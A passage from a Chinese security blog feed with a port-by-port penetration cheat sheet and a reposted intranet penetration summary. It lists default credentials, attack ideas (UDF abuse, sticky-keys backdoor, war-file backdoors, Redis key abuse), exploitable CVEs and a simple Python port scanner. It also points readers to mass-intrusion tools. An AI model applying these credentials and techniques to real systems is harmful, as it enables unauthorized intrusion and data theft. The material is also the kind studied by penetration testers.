Server的登录密码。``（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。`</span><br></pre></td></tr></table></figure><h2 id="1521端口渗透-剖析"><a href="#1521端口渗透-剖析" class="headerlink" title="1521端口渗透.剖析"></a><strong>1521端口渗透.剖析</strong></h2><p>1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。</span><br><span class="line">（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。</span><br><span class="line">（3）在注入点直接创建java，执行系统命令。</span><br><span class="line">（4）https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</span><br></pre></td></tr></table></figure><p>-————————————————————–<br>以上的端口渗透原理只是用作分析，现在网上有很多自动的端口<a href="http://www.05112.com/" target="_blank" rel="noopener">入侵</a>工具，比如445批量抓鸡器或者1433批量抓鸡器。大家有兴趣的可以去网上<a href="http://www.2cto.com/soft" target="_blank" rel="noopener">下载</a>试用。————————————————————</p><h2 id="2049端口渗透剖析"><a href="#2049端口渗透剖析" class="headerlink" title="2049端口渗透剖析"></a><strong>2049端口渗透剖析</strong></h2><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`未授权访问。（https:``//www.freebuf.com/articles/network/159468.html）           (http://www.secist.com/archives/6192.htm)`</span><br></pre></td></tr></table></figure><h2 id="3306端口渗透剖析"><a href="#3306端口渗透剖析" class="headerlink" title="3306端口渗透剖析"></a><strong>3306端口渗透剖析</strong></h2><p>3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。``（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。``（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。`</span><br></pre></td></tr></table></figure><h2 id="3389端口渗透剖析"><a href="#3389端口渗透剖析" class="headerlink" title="3389端口渗透剖析"></a><strong>3389端口渗透剖析</strong></h2><p>3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。``（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。``（3）Shift粘滞键后门：5次shift后门``（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。（5）爆破3389端口。这里还是推荐使用hydra爆破工具。（6）ms12_020死亡蓝屏攻击。（https:``//www.cnblogs.com/R-Hacker/p/9178066.html）（7）https://www.cnblogs.com/backlion/p/9429738.html`</span><br></pre></td></tr></table></figure><h2 id="4899端口渗透剖析"><a href="#4899端口渗透剖析" class="headerlink" title="4899端口渗透剖析"></a><strong>4899端口渗透剖析</strong></h2><p>4899端口是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP/IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。``（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。`</span><br></pre></td></tr></table></figure><h2 id="5432端口渗透剖析"><a href="#5432端口渗透剖析" class="headerlink" title="5432端口渗透剖析"></a><strong>5432端口渗透剖析</strong></h2><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）爆破：弱口令：postgres postgres``（2）缓冲区溢出：CVE-2014-2669。（http:``//drops.xmd5.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://www.secpulse.com/archives/69153.html）`</span><br></pre></td></tr></table></figure><h2 id="5631端口渗透剖析"><a href="#5631端口渗透剖析" class="headerlink" title="5631端口渗透剖析"></a><strong>5631端口渗透剖析</strong></h2><p>5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意<a href="http://www.2cto.com/soft" target="_blank" rel="noopener">下载</a>保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`PcAnyWhere提权。（https:``//blog.csdn.net/Fly_hps/article/details/80377199）`</span><br></pre></td></tr></table></figure><h2 id="5900端口渗透剖析"><a href="#5900端口渗透剖析" class="headerlink" title="5900端口渗透剖析"></a><strong>5900端口渗透剖析</strong></h2><p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放<a href="http://www.2cto.com/ym" target="_blank" rel="noopener">源码</a>软件，远程控制能力强大，高效实用，其性能可以和<a href="http://www.2cto.com/os/windows/" target="_blank" rel="noopener">windows</a>和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。``（2）cain同样支持对VNC的嗅探，同时支持端口修改。``（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。（4）VNC拒绝服务攻击（CVE-2015-5239）。（http:``//blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）（5）VNC权限提升（CVE-2013-6886）。`</span><br></pre></td></tr></table></figure><h2 id="6379端口渗透剖析"><a href="#6379端口渗透剖析" class="headerlink" title="6379端口渗透剖析"></a><strong>6379端口渗透剖析</strong></h2><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）爆破：弱口令``（2）未授权访问+配合ssh key提权。（http:``//www.alloyteam.com/2017/07/12910/）`</span><br></pre></td></tr></table></figure><h2 id="7001-7002端口渗透剖析"><a href="#7001-7002端口渗透剖析" class="headerlink" title="7001/7002端口渗透剖析"></a><strong>7001/7002端口渗透剖析</strong></h2><p>7001/7002通常是weblogic中间件端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic``（2）管理后台部署 war 后门``（3）SSRF``（4）反序列化漏洞``（5）weblogic_uachttps:``//github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com/thread-224954.htmhttps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html`</span><br></pre></td></tr></table></figure><h2 id="8080端口渗透剖析"><a href="#8080端口渗透剖析" class="headerlink" title="8080端口渗透剖析"></a><strong>8080端口渗透剖析</strong></h2><p>8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）Tomcat远程代码执行漏洞（https:``//www.freebuf.com/column/159200.html）</span><br><span class="line">（2）Tomcat任意文件上传。（http:``//liehu.tass.com.cn/archives/836）</span><br><span class="line">（3）Tomcat远程代码执行&amp;信息泄露。（https:``//paper.seebug.org/399/）</span><br><span class="line">（4）Jboss远程代码执行。（http:``//mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）</span><br><span class="line">（5）Jboss反序列化漏洞。（https:``//www.zybuluo.com/websec007/note/838374）</span><br><span class="line">（6）Jboss漏洞利用。（https:``//blog.csdn.net/u011215939/article/details/79141624）</span><br></pre></td></tr></table></figure><h2 id="27017端口渗透剖析"><a href="#27017端口渗透剖析" class="headerlink" title="27017端口渗透剖析"></a><strong>27017端口渗透剖析</strong></h2><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）爆破：弱口令``（2）未授权访问；（http:``//www.cnblogs.com/LittleHann/p/6252421.html）（3）http://www.tiejiang.org/19157.htm`</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;端口就和大门一样，是通往渗透中信息收集必不可少步骤，今天给大家整理一下在渗透中常用的一些端口以及一些端口的漏洞利用方式。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>内网安全检查/渗透总结</title>
    <link href="https://www.mad-coding.cn/2020/01/03/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5-%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mad-coding.cn/2020/01/03/内网安全检查-渗透总结/</id>
    <published>2020-01-03T06:13:53.000Z</published>
    <updated>2020-01-03T07:07:31.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今日，和往常一样在网上浏览一些大牛写的技术文章，来填充自己的知识空白，于是看到了先知社区上的这篇<a href="https://xz.aliyun.com/t/2354#toc-53" target="_blank" rel="noopener">《内网安全检查/渗透总结》</a>，看到这篇文章我就被深深的震撼了，总结的太好了，对于我这个菜鸟来说，填补了我不少知识空白。所以这里转载保存，方便他日继续消化。</p><a id="more"></a><h2 id="0-1-内网安全检查-渗透介绍"><a href="#0-1-内网安全检查-渗透介绍" class="headerlink" title="0.1 内网安全检查/渗透介绍"></a>0.1 内网安全检查/渗透介绍</h2><h3 id="0-1-1-攻击思路"><a href="#0-1-1-攻击思路" class="headerlink" title="0.1.1 攻击思路"></a>0.1.1 攻击思路</h3><p>有2种思路：</p><ol><li>攻击外网服务器，获取外网服务器的权限，接着利用入侵成功的外网服务器作为跳板，攻击内网其他服务器，最后获得敏感数据，并将数据传递到攻击者，看情况安装长期后门，实现长期控制和获得敏感数据的方式；</li><li>攻击办公网的系统、办公网电脑、办公网无线等方式，一般是采用社工，实现控制办公电脑，再用获得的办公网数据，可能是内网的各种登录账号和密码，再获取办公网或者生产网的有用数据。</li></ol><p>一般内网安全检查使用第一种思路，实际的攻击2种思路结合实现。</p><h3 id="0-1-2-敏感资料-数据-信息"><a href="#0-1-2-敏感资料-数据-信息" class="headerlink" title="0.1.2 敏感资料/数据/信息"></a>0.1.2 敏感资料/数据/信息</h3><ul><li>高管/系统管理员/财务/人事/业务人员的个人电脑</li><li>文件服务器/共享服务器</li><li>邮件服务器</li><li>OA服务器</li><li>数据库服务器</li></ul><h3 id="0-1-3-攻击过程"><a href="#0-1-3-攻击过程" class="headerlink" title="0.1.3 攻击过程"></a>0.1.3 攻击过程</h3><p>按照第一种思路，个人认为可以分为4个阶段：</p><ol><li>信息收集</li><li>漏洞验证/漏洞攻击</li><li>后渗透</li><li>日志清理</li></ol><p>第二种思路，社工的比重更大一些，本篇不多做介绍。</p><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>该阶段识别内网存活的主机 IP， 运行端口扫描和漏洞扫描获取可以利用的漏洞</p><h2 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h2><p>使用端口扫描工具可以实现主机发现的功能，但也有些动作小的主机发现工具（Kali），可以有效的发现存活主机。自己写个 ping 的循环脚本也可以。</p><p>不受限的测试直接端口扫描了。</p><h2 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h2><p>有授权的情况下直接使用 nmap 、masscan 等端口扫描工具直接获取开放的端口信息。<br>作为跳板机可以使用 Metasploit 做端口扫描，也可以在跳板主机上上传端口扫描工具，使用工具扫描。</p><p>入侵到服务器上也可以根据服务器的环境使用自定义的端口扫描脚本扫描端口。</p><p>python 3 的端口扫描脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># This script runs on Python 3</span><br><span class="line">import socket, threading</span><br><span class="line"></span><br><span class="line">def TCP_connect(ip, port_number, delay, output):</span><br><span class="line">    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    TCPsock.settimeout(delay)</span><br><span class="line">    try:</span><br><span class="line">        TCPsock.connect((ip, port_number))</span><br><span class="line">        output[port_number] = &apos;Listening&apos;</span><br><span class="line">    except:</span><br><span class="line">        output[port_number] = &apos;&apos;</span><br><span class="line"></span><br><span class="line">def scan_ports(host_ip, delay):</span><br><span class="line"></span><br><span class="line">    threads = []        # To run TCP_connect concurrently</span><br><span class="line">    output = &#123;&#125;         # For printing purposes</span><br><span class="line"></span><br><span class="line">    # Spawning threads to scan ports</span><br><span class="line">    for i in range(10000):</span><br><span class="line">        t = threading.Thread(target=TCP_connect, args=(host_ip, i, delay, output))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    # Starting threads</span><br><span class="line">    for i in range(10000):</span><br><span class="line">        threads[i].start()</span><br><span class="line"></span><br><span class="line">    # Locking the script until all threads complete</span><br><span class="line">    for i in range(10000):</span><br><span class="line">        threads[i].join()</span><br><span class="line"></span><br><span class="line">    # Printing listening ports from small to large</span><br><span class="line">    for i in range(10000):</span><br><span class="line">        if output[i] == &apos;Listening&apos;:</span><br><span class="line">            print(str(i) + &apos;: &apos; + output[i])</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    host_ip = input(&quot;Enter host IP: &quot;)</span><br><span class="line">    delay = int(input(&quot;How many seconds the socket is going to wait until timeout: &quot;))   </span><br><span class="line">    scan_ports(host_ip, delay)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>有个使用 Python 端口扫描的介绍<br><a href="https://thief.one/2018/05/17/1/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io" target="_blank" rel="noopener">https://thief.one/2018/05/17/1/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io</a></p><p>Windows 下基于 Powershell 的端口扫描脚本。<br><a href="https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner/tree/master/Scripts" target="_blank" rel="noopener">https://github.com/BornToBeRoot/PowerShell_IPv4PortScanner/tree/master/Scripts</a></p><p>发现端口后使用客户端连接工具或者 nc 连接，获取服务端的 banner 信息。</p><h2 id="1-3-漏洞扫描"><a href="#1-3-漏洞扫描" class="headerlink" title="1.3 漏洞扫描"></a>1.3 漏洞扫描</h2><p>有授权的情况下，使用绿盟极光、Nessus、Nexpose 等漏扫工具直接扫描目标，可以直接看到存活主机和主机的漏洞情况。</p><h2 id="1-4-识别内网环境"><a href="#1-4-识别内网环境" class="headerlink" title="1.4 识别内网环境"></a>1.4 识别内网环境</h2><p>获取目标的主机存活信息和端口开放信息后，就可以尝试分析目标的网络结构，安全防御策略。按照办公网和生产网分别说一下：</p><h3 id="1-4-1-办公网"><a href="#1-4-1-办公网" class="headerlink" title="1.4.1 办公网"></a>1.4.1 办公网</h3><p>按照系统区分：</p><ul><li>OA系统</li><li>邮件系统</li><li>财务系统</li><li>文件共享系统</li><li>域控</li><li>企业版杀毒系统</li><li>上网行为管理系统</li><li>内部应用监控系统</li></ul><p>按照网络区分：</p><ul><li>管理网段</li><li>内部系统网段</li><li>按照部门区分的网段</li></ul><p>按照设备区分：</p><ul><li>个人电脑</li><li>内网服务器</li><li>网络设备</li><li>安全设备</li></ul><p>办公网的安全防护水平一般较差（相对），能绕过杀毒软件基本上就畅通无阻了，利用信任关系容易扩大攻击面，获取数据也比生产网简单。</p><h3 id="1-4-2-生产网"><a href="#1-4-2-生产网" class="headerlink" title="1.4.2 生产网"></a>1.4.2 生产网</h3><p>按照系统区分：</p><ul><li>业务系统</li><li>运维监控系统</li><li>安全系统</li></ul><p>按照网络区分：</p><ul><li>各不同的业务网段</li><li>运维监控网段</li><li>安全管理网段</li></ul><p>根据目标开展的不同业务，对应的服务器可能存在不同的网段上，分析服务器上运行的服务和进程可以推断目标使用的运维监控管理系统和安全防护系统，可以大概推断出入侵目标的 IT 运维水平和安全防护水平，在接下来的入侵考虑采用什么样的方法。</p><h1 id="0x02-漏洞验证-漏洞攻击"><a href="#0x02-漏洞验证-漏洞攻击" class="headerlink" title="0x02 漏洞验证/漏洞攻击"></a>0x02 漏洞验证/漏洞攻击</h1><p>使用端口扫描、漏洞扫描验证扫描目标开放的端口，在对应端口上开放的服务，运行该服务的软件和版本号。<br>如果只是使用端口扫描，只是发现开放的端口，接着使用 nc 可以获取端口上服务的 banner 信息，获取 banner 信息后需要在漏洞库上查找对应 CVE，后面就是验证漏洞是否存在。如果是使用漏洞扫描工具可以直接获取对应端口上的漏洞，后面也是验证漏洞。<br>安全检查一般是尽可能的发现所有漏洞，对漏洞的风险进行评估和修复。入侵的话只关注高危远程代码执行和敏感信息泄露漏洞等可以直接利用的漏洞。</p><p>漏洞验证可以找对应的 CVE 编号的 POC、EXP，利用代码在 ExploitDB 、seebug上查看或者在 github 上搜索是否有相关的漏洞验证或利用的工具。</p><h2 id="2-1-Web"><a href="#2-1-Web" class="headerlink" title="2.1 Web"></a>2.1 Web</h2><h3 id="2-1-1-自定义-Web-应用"><a href="#2-1-1-自定义-Web-应用" class="headerlink" title="2.1.1 自定义 Web 应用"></a>2.1.1 自定义 Web 应用</h3><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p><h3 id="2-1-2-Web-中间件"><a href="#2-1-2-Web-中间件" class="headerlink" title="2.1.2 Web 中间件"></a>2.1.2 Web 中间件</h3><h4 id="1-Tomcat"><a href="#1-Tomcat" class="headerlink" title="1. Tomcat"></a>1. Tomcat</h4><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p><ul><li>端口号：8080</li><li>攻击方法：<ul><li>默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</li><li>在管理后台部署 war 后门文件</li><li>远程代码执行漏洞</li></ul></li><li>参考：<ul><li><a href="https://paper.seebug.org/399/" target="_blank" rel="noopener">https://paper.seebug.org/399/</a></li><li><a href="http://www.freebuf.com/column/159200.html" target="_blank" rel="noopener">http://www.freebuf.com/column/159200.html</a></li><li><a href="http://liehu.tass.com.cn/archives/836" target="_blank" rel="noopener">http://liehu.tass.com.cn/archives/836</a></li><li><a href="http://www.mottoin.com/87173.html" target="_blank" rel="noopener">http://www.mottoin.com/87173.html</a></li></ul></li></ul><h4 id="2-Jboss"><a href="#2-Jboss" class="headerlink" title="2. Jboss"></a>2. Jboss</h4><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p><ul><li>端口：8080</li><li>攻击方法：<ul><li>弱口令，爆破</li><li>管理后台部署 war 后门</li><li>反序列化</li><li>远程代码执行</li></ul></li><li>参考：<ul><li><a href="http://www.vuln.cn/6300" target="_blank" rel="noopener">http://www.vuln.cn/6300</a></li><li><a href="http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html" target="_blank" rel="noopener">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</a></li><li><a href="https://www.zybuluo.com/websec007/note/838374" target="_blank" rel="noopener">https://www.zybuluo.com/websec007/note/838374</a></li><li><a href="https://blog.csdn.net/u011215939/article/details/79141624" target="_blank" rel="noopener">https://blog.csdn.net/u011215939/article/details/79141624</a></li></ul></li></ul><h4 id="3-WebLogic"><a href="#3-WebLogic" class="headerlink" title="3. WebLogic"></a>3. WebLogic</h4><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><ul><li>端口：7001，7002</li><li>攻击方法：<ul><li>弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</li><li>管理后台部署 war 后门</li><li>SSRF</li><li>反序列化漏洞</li><li>weblogic_uac</li></ul></li><li>参考：<ul><li><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></li><li><a href="https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html" target="_blank" rel="noopener">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</a></li><li><a href="https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/" target="_blank" rel="noopener">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</a></li><li><a href="https://bbs.pediy.com/thread-224954.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224954.htm</a></li></ul></li></ul><h4 id="4-WebSphere"><a href="#4-WebSphere" class="headerlink" title="4. WebSphere"></a>4. WebSphere</h4><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p><ul><li>端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</li><li>攻击方法：<ul><li>控制台登录爆破</li><li>很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</li><li>反序列化</li><li>任意文件泄露</li></ul></li><li>参考：<ul><li><a href="https://loudong.sjtu.edu.cn/?keyword=WebSphere&serverity=高危" target="_blank" rel="noopener">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</a></li><li><a href="http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803" target="_blank" rel="noopener">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</a></li><li><a href="https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7" target="_blank" rel="noopener">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</a></li></ul></li></ul><h4 id="5-Glassfish"><a href="#5-Glassfish" class="headerlink" title="5. Glassfish"></a>5. Glassfish</h4><h3 id="2-1-3-Web-框架"><a href="#2-1-3-Web-框架" class="headerlink" title="2.1.3 Web 框架"></a>2.1.3 Web 框架</h3><h4 id="1-Struts2"><a href="#1-Struts2" class="headerlink" title="1. Struts2"></a>1. Struts2</h4><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p><ul><li>可利用漏洞<ul><li>S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</li><li>S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</li><li>S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</li><li>S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</li><li>S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</li><li>S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</li><li>S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</li><li>S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</li><li>S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</li><li>S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</li></ul></li><li>参考：<ul><li><a href="https://github.com/hktalent/myhktools" target="_blank" rel="noopener">https://github.com/hktalent/myhktools</a></li><li><a href="https://github.com/Lucifer1993/struts-scan" target="_blank" rel="noopener">https://github.com/Lucifer1993/struts-scan</a></li><li><a href="https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095" target="_blank" rel="noopener">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</a></li></ul></li></ul><h4 id="2-Spring-框架"><a href="#2-Spring-框架" class="headerlink" title="2. Spring 框架"></a>2. Spring 框架</h4><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring 